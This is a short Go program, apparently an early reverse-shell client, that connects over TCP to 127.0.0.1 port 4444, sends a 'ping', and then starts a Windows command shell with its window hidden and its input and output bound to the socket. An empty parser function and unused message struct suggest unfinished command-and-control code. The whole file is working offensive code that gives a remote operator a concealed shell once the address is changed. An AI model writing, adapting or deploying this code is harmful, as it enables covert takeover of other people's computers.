package main

import (
	"fmt"
	"net"
	"os/exec"
	"syscall"
)

type Msg struct {
	cmd  string
	args []string
}

func parser(str string) {

}

func main() {
	connection, err := net.Dial("tcp", "127.0.0.1:4444")
	if err != nil {
		panic(err)
	}
	defer connection.Close()
	buffer := make([]byte, 1024)
	connection.Write([]byte("ping\n"))
	mLen, err := connection.Read(buffer)

	if err != nil {
		panic(err)
	}

	fmt.Println(string(buffer[:mLen]))

	cmd := exec.Command("cmd")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// Redirect the command's standard input, output, and error to the established connection
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()

}
